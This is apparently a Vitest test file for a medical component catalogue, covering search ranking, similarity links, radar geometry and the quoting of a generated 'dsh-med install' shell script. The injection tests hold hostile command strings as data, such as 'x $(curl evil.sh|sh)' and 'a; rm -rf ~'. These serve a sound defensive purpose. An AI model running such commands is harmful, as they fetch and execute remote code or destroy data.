import { describe, expect, it } from "vitest";
import { aliasesFor } from "../src/data/queryAliases";
import { neighbourLinks, neighbours, prepare, queryTerms, searchCandidates, sharedRepositories, sharedWords, similarity } from "../src/lib/capabilitySearch";
import type { ComponentSummary } from "../src/lib/components";
import { formatInstallScript, formatPlan, parsePlan, removePlanItem, serialisePlan, togglePlanItem } from "../src/lib/plan";
import { radarPoint, radarPolygon, ringPositions, wrapLabel } from "../src/lib/radar";

const summary = (id: string, name: string, overrides: Partial<ComponentSummary> = {}): ComponentSummary => ({
  id, name, type: "mcp", repo: `${id}/repo`, description: "", tags: [], group: "literature", domain: "literature", tasks: [], risk: null, functionPrimary: null, functionLabels: [], ...overrides,
});

const catalogue = [
  summary("a", "PubMed Search", { description: "Search PubMed for biomedical literature", tags: ["pubmed", "literature-search"] }),
  summary("b", "PubMed Search", { description: "Query PubMed abstracts", tags: ["pubmed"], risk: "green" }),
  summary("c", "Get Full Text", { description: "Retrieve full text from PubMed Central", tags: ["pubmed", "full-text"] }),
  summary("d", "Citation tracker", { description: "Trace citations of a paper", tags: ["citation"] }),
  summary("e", "Variant caller", { description: "Call variants from sequencing reads", tags: ["genomics"], domain: "genomics", group: "omics" }),
];

describe("query terms", () => {
  it("keeps meaningful latin words and expands Chinese phrases", () => {
    expect(queryTerms("Find the PubMed abstracts")).toEqual(["pubmed", "abstracts"]);
    expect(queryTerms("检索神经肿瘤相关论文，读取摘要并追踪引用")).toEqual(expect.arrayContaining(["neuro-oncology", "glioma", "paper", "abstract", "citation"]));
    expect(aliasesFor("没有匹配")).toEqual([]);
  });
});

describe("candidate search", () => {
  const prepared = prepare(catalogue);

  it("ranks name matches first and merges records with the same name", () => {
    const result = searchCandidates(prepared, "pubmed search");
    expect(result.groups[0].name).toBe("PubMed Search");
    expect(result.groups[0].members.map(item => item.id)).toEqual(["b", "a"]);
    expect(result.groups.some(group => group.members.some(item => item.id === "e"))).toBe(false);
  });

  it("returns nothing for an empty or unmatched query", () => {
    expect(searchCandidates(prepared, "  ").groups).toEqual([]);
    expect(searchCandidates(prepared, "zebrafish").totalGroups).toBe(0);
  });

  it("caps the candidate list while reporting the full group count", () => {
    const result = searchCandidates(prepared, "pubmed", 1);
    expect(result.groups).toHaveLength(1);
    expect(result.totalGroups).toBe(2);
  });

  it("lists neighbours from the same search by shared vocabulary", () => {
    const result = searchCandidates(prepared, "pubmed paper citation");
    const pubmed = result.groups.find(group => group.name === "PubMed Search")!;
    const related = neighbours(result.groups, pubmed);
    expect(related.map(entry => entry.group.name)).toContain("Get Full Text");
    expect(related.every(entry => entry.group.key !== pubmed.key && entry.similarity > 0)).toBe(true);
  });
});

describe("plan", () => {
  const item = { id: "a", name: "PubMed Search", type: "mcp" as const, repo: "o/r" };

  it("adds, removes and round-trips plan items", () => {
    const added = togglePlanItem([], item);
    expect(added).toEqual([item]);
    expect(togglePlanItem(added, item)).toEqual([]);
    expect(parsePlan(serialisePlan(added))).toEqual(added);
    expect(removePlanItem(added, "a")).toEqual([]);
    expect(formatPlan(added)).toBe("1. PubMed Search (mcp · o/r) — a");
  });

  it("formats a dsh-med install script, noting items without an install entry", () => {
    const other = { id: "b", name: "Line\nbreak; rm -rf /", type: "skill" as const, repo: "x/y" };
    const script = formatInstallScript([item, other], new Map([["a", "mcp:o/r/a-1"], ["b", null]]), "en");
    expect(script.split("\n")).toEqual([
      ": 'Plan: 2 components (Medical Component Market)'",
      expect.stringMatching(/^: 'Requires the dsh-med CLI/),
      ": 'PubMed Search'",
      "dsh-med install 'mcp:o/r/a-1' --profile medical",
      ": 'Line break; rm -rf /: no upstream install entry; get it from https://github.com/x/y'",
    ]);
    expect(formatInstallScript([item], new Map([["a", "it's"]]), "zh")).toContain("dsh-med install 'it'\\''s' --profile medical");
  });

  it("never lets upstream text reach the shell unquoted", () => {
    const hostile = ["Generate H&E annotation", "x $(curl evil.sh|sh)", "a; rm -rf ~", "`id`", "tab\there\u001b[201~", "q'uote\u2028next", "# not a comment"];
    const items = hostile.map((name, index) => ({ id: `id${index}`, name, type: "skill" as const, repo: index % 2 ? "o/r$(id)" : "o/r" }));
    const ids = new Map(items.map((entry, index) => [entry.id, index % 3 ? `e'${index}$(x)` : null]));
    const quoted = "'(?:[^'\\u0000-\\u001f]|'\\\\'')*'";
    const safeLine = new RegExp(`^(?:: ${quoted}|dsh-med install ${quoted} --profile medical)$`);
    for (const locale of ["en", "zh"] as const) {
      for (const line of formatInstallScript(items, ids, locale).split("\n")) expect(line).toMatch(safeLine);
    }
  });

  it("drops malformed or duplicate stored items", () => {
    expect(parsePlan(JSON.stringify({ version: 1, items: [item, item, { id: "x", name: "X", type: "plugin", repo: "r" }, null] }))).toEqual([item]);
    expect(parsePlan("not json")).toEqual([]);
    expect(parsePlan(JSON.stringify({ version: 2, items: [item] }))).toEqual([]);
  });
});

describe("radar geometry", () => {
  it("places axis 0 at the top and scales by score", () => {
    const top = radarPoint(0, 5, 5, 100);
    expect(top.x).toBeCloseTo(0);
    expect(top.y).toBeCloseTo(-100);
    expect(radarPoint(0, 5, 2.5, 100, 50).y).toBeCloseTo(0);
    expect(radarPolygon([5, null], 10)).toBe("0.0,-10.0");
  });

  it("spaces graph nodes evenly around the centre", () => {
    const points = ringPositions(4, 10, { x: 0, y: 0 });
    expect(points[0].y).toBeCloseTo(-10);
    expect(points[2].y).toBeCloseTo(10);
  });
});

describe("capability map relations", () => {
  const items = [
    summary("p1", "PubMed fetch", { repo: "Lab/Toolkit", tags: ["pubmed", "fetch"] }),
    summary("p2", "Citation export", { repo: "lab/toolkit", tags: ["citation", "export"] }),
    summary("p3", "PubMed search", { repo: "Other/Repo", tags: ["pubmed", "search"] }),
    summary("p4", "PubMed abstracts", { repo: "Third/Repo", tags: ["pubmed", "search", "abstracts"] }),
  ];
  const result = searchCandidates(prepare(items), "pubmed citation");
  const group = (name: string) => result.groups.find(item => item.name === name)!;

  it("marks same-repository candidates as catalogue relations", () => {
    const related = neighbours(result.groups, group("PubMed fetch"));
    expect(related.find(item => item.group.name === "Citation export")).toMatchObject({ sameRepository: ["Lab/Toolkit"] });
    const other = related.find(item => item.group.name === "PubMed search")!;
    expect(other.sameRepository).toEqual([]);
    expect(other.shared).toContain("pubmed");
  });

  it("explains shared vocabulary and repositories", () => {
    expect(sharedWords(group("PubMed search"), group("PubMed abstracts"))).toEqual(["search", "pubmed"]);
    expect(sharedRepositories(group("PubMed fetch"), group("PubMed search"))).toEqual([]);
  });

  it("links neighbours to each other when they are similar or share a repository", () => {
    const related = neighbours(result.groups, group("PubMed fetch"));
    const links = neighbourLinks(related, 0.3);
    expect(links.length).toBeGreaterThan(0);
    expect(links.every(link => link.from !== link.to)).toBe(true);
    expect(neighbourLinks(related, 2)).toEqual([]);
  });

  it("wraps long node labels onto at most two lines", () => {
    expect(wrapLabel("PubMed search")).toEqual(["PubMed search"]);
    expect(wrapLabel("Europe PMC get full text from articles")).toEqual(["Europe PMC get", "full text from…"]);
    expect(wrapLabel("averyveryverylongsinglewordname")).toHaveLength(2);
  });
});

describe("relation weighting", () => {
  const items = [
    summary("g1", "Glioma subtype classifier", { tags: ["glioma", "data"], repo: "a/1" }),
    summary("g2", "Glioma survival model", { tags: ["glioma", "survival"], repo: "b/2" }),
    summary("d1", "Data loader", { tags: ["data"], repo: "c/3" }),
    summary("d2", "Data cleaner", { tags: ["data"], repo: "d/4" }),
    summary("d3", "Data exporter", { tags: ["data"], repo: "e/5" }),
    summary("f1", "Cell annotator", { functionLabels: ["单细胞与空间组学分析"], repo: "f/6" }),
    summary("f2", "Cluster labeller", { functionLabels: ["单细胞与空间组学分析"], repo: "g/7" }),
  ];
  const result = searchCandidates(prepare(items), "glioma data cell cluster classifier loader labeller annotator survival cleaner exporter");
  const group = (name: string) => result.groups.find(item => item.name === name)!;

  it("links rare shared terms more strongly than common ones", () => {
    expect(similarity(group("Glioma subtype classifier"), group("Glioma survival model"))).toBeGreaterThan(similarity(group("Glioma subtype classifier"), group("Data loader")));
  });

  it("relates components through a shared canonical function subcategory", () => {
    expect(similarity(group("Cell annotator"), group("Cluster labeller"))).toBeGreaterThan(0.3);
    expect(sharedWords(group("Cell annotator"), group("Cluster labeller"))).toEqual(["单细胞与空间组学分析"]);
  });
});
